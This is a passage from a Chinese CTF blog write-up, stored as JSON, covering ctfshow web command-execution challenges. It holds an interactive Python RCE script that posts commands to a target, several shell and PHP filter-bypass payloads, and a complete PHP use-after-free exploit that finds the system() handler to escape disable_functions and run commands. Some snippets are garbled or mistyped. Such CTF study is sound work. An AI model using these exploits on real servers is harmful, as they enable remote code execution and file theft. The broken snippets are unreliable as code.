s1=\"\"\n       s2=\"\"\n       for i in arg:\n           f=open(\"rce_or.txt\",\"r\")\n           while True:\n               t=f.readline()\n               if t==\"\":\n                   break\n               if t[0]==i:\n                   #print(i)\n                   s1+=t[2:5]\n                   s2+=t[6:9]\n                   break\n           f.close()\n       output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\"\n       return(output)\n   \nwhile True:\n       param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))\n       data={\n           'c':urllib.parse.unquote(param)\n           }\n       r=requests.post(url,data=data)\n       print(\"\\n[*] result:\\n\"+r.text)\n</code></pre>\n<pre><code>                             -- 来源于[ yu22x 的博客文章](https://blog.csdn.net/miuzzx/article/details/108569080)\n</code></pre>\n<h2 id=\"web-42\"><a href=\"#web-42\" class=\"headerlink\" title=\"web 42\"></a>web 42</h2><p>双写绕过，分号分隔，分号后面被写入</p>\n<h2 id=\"web-43\"><a href=\"#web-43\" class=\"headerlink\" title=\"web 43\"></a>web 43</h2><p>源码类型同42，但过滤了分号和<code>cat</code>，可以使用<code>&amp;&amp;</code>, 用来分隔两个命令，如果前一个执行成功第二个不会执行</p>\n<h2 id=\"web-50、51\"><a href=\"#web-50、51\" class=\"headerlink\" title=\"web 50、51\"></a>web 50、51</h2><p>不用空格的命令</p>\n<p><code>?c=nl&lt;fla''g.php%7C%7Cls</code>(<code>%7C%7C</code> 为<code>||</code>) 其中不用通配符是因为不支持，使用单引号忽略</p>\n<h2 id=\"web-55\"><a href=\"#web-55\" class=\"headerlink\" title=\"web 55\"></a>web 55</h2><p>无字母 RCE</p>\n<p>可以上传文件到服务器上</p>\n<p>在本地制作文件上传表单</p>\n<p>而上传后php会把该文件放在一个临时目录下，命名规则为 php+5 位小写字母 + 大写字母，但该文件名不可控，可以使用占位符进行匹配</p>\n<p><code>/???/????????</code>而如果最后有大写字母，也可以写成<code>/???/???????[@-[]</code></p>\n<p>如果点号 . 没有过滤，在linux系统里可以使用点号. 用来执行脚本文件，即可写<code>?c=.%20/???/??????[@-[]</code></p>\n<p>然后通过抓包不断修改文件的内容</p>\n<h2 id=\"web-57\"><a href=\"#web-57\" class=\"headerlink\" title=\"web 57\"></a>web 57</h2><p>题目只要构造出 36 即可，而 $ 没有过滤，可以使用 $(()) 进行构造</p>\n<p><code>echo $(())</code>返回0，取反后<code>echo $((~$(())))</code>即为-1，那么我们可以加上37个-1再取反</p>\n<p><code>echo ~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))</code></p>\n<p>返回36</p>\n<h2 id=\"web-62、63、64\"><a href=\"#web-62、63、64\" class=\"headerlink\" title=\"web 62、63、64\"></a>web 62、63、64</h2><ol>\n<li><code>include(\"flag.php\");echo $flag;</code></li>\n<li>或者先 include 包含 flag.php，再使用 get_defined_vars (), 获取变量名及值</li>\n<li></li>\n</ol>\n<h2 id=\"web-66\"><a href=\"#web-66\" class=\"headerlink\" title=\"web 66\"></a>web 66</h2><p><code>var_dump(scandir('*'));var_dump(scandir ('/'));</code>读取相关的目录</p>\n<h2 id=\"web-68\"><a href=\"#web-68\" class=\"headerlink\" title=\"web 68\"></a>web 68</h2><p><code>highlight_file</code>被禁，用<code>include</code>，<code>include ('/flag.txt');</code>因为没有php代码，则直接输出</p>\n<h2 id=\"web-71\"><a href=\"#web-71\" class=\"headerlink\" title=\"web 71\"></a>web 71</h2><p>内容被替换</p>\n<p>思路为提前结束，不执行下面的代码</p>\n<p><code>include('flag.txt');exit();</code></p>\n<h2 id=\"web-72\"><a href=\"#web-72\" class=\"headerlink\" title=\"web 72\"></a>web 72</h2><p><code>var_dump()</code>被禁</p>\n<p><code>scandir('/')</code>不能正确读取，因为有了<code>open_basedir()</code>, 而<code>ini_set ()</code>也被禁用，不能修改</p>\n<p>那么可以使用<code>glob</code>协议进行绕过</p>\n<pre><code class=\"php\">c=$a=\"glob:///*.txt\";\nif($b = opendir($a)){\n    while(($file = readdir($b))!== false ){\n        echo \"filename:\".$file.\"\\n\";\n    }\n    closedir($b);\n}\nexit();// 为了绕过后面的替换内容\n</code></pre>\n<p>虽然知道flag的文件名，但是无法读取</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">?&gt;&lt;?php\npwn(\"cat /flag0.txt\");\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this-&gt;a);\n            $backtrace = (new Exception)-&gt;getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n    function str2ptr(&amp;$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j &gt;= 0; $j--) {\n            $address &lt;&lt;= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i &lt; $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr &amp; 0xff));\n            $ptr &gt;&gt;= 8;\n        }\n        return $out;\n    }\n    function write(&amp;$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i &lt; $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v &amp; 0xff));\n            $v &gt;&gt;= 8;\n        }\n    }\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper-&gt;a);\n        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }\n        return $leak;\n    }\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n        for($i = 0; $i &lt; $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n        return [$data_addr, $text_size, $data_size];\n    }\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i &lt; $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n            return $data_addr + $i * 8;\n        }\n    }\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak &amp; 0xfffffffffffff000;\n        for($i = 0; $i &lt; 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n    function my_str_repeat($a,$b){\n        $s = '';\n        for($i = 0; $i &lt;= $b;$i++){\n            $s.=$a;\n        }  \n        return $s;\n    }\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(my_str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln-&gt;a = $arg;\n    }\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i &lt; $n_alloc; $i++)\n        $contiguous[] = str_shuffle(my_str_repeat('A', 79));\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n    $helper = new Helper;\n    $helper-&gt;b = function ($x) { };\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n    $closure_obj = str2ptr($abc, 0x20);\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i &lt; 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n    ($helper-&gt;b)($cmd);\n    exit();\n}\nexit();\n</code></pre>\n<h2 id=\"web-75\"><a href=\"#web-75\" class=\"headerlink\" title=\"web 75\"></a>web 75</h2><p>先通过glob读取文件目录</p>\n<p>用数据库pdo读取</p>\n<pre><code class=\"php\">try {\n        $dbh = new  PDO('mysql : host=localhost ; dbname=ctftraining', ' root', ' root');\n        foreach ($dbh-&gt;query('select- load_ file(\"/flag36.txt\") ') as  $row) {\n            echo ($row[0]) . \"I\";\n        }\n        $dbh = null;\n    } catch (PDOException $e) {\n        echo $e-&gt;getMessage();\n        exit(0);\n    }\n    exit(0);\n</code></pre>\n<h2 id=\"web-77\"><a href=\"#web-77\" class=\"headerlink\" title=\"web 77\"></a>web 77</h2><p>盲测特性</p>\n<pre><code class=\"php\">c=$ffi = FFl:cdef(\"int system(const char *command);\");\n$a='/readflag&gt; 1.txt';\nff-&gt;system($a);\n</code></pre>\n<h2 id=\"web-118\"><a href=\"#web-118\" class=\"headerlink\" title=\"web 118\"></a>web 118</h2><p><code>${PATH:~A}${PWD:~A}$IFS????.???</code></p>\n<p>nl 命令</p>\n<h2 id=\"web-119\"><a href=\"#web-119\" class=\"headerlink\" title=\"web 119\"></a>web 119</h2>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        }
    ]
}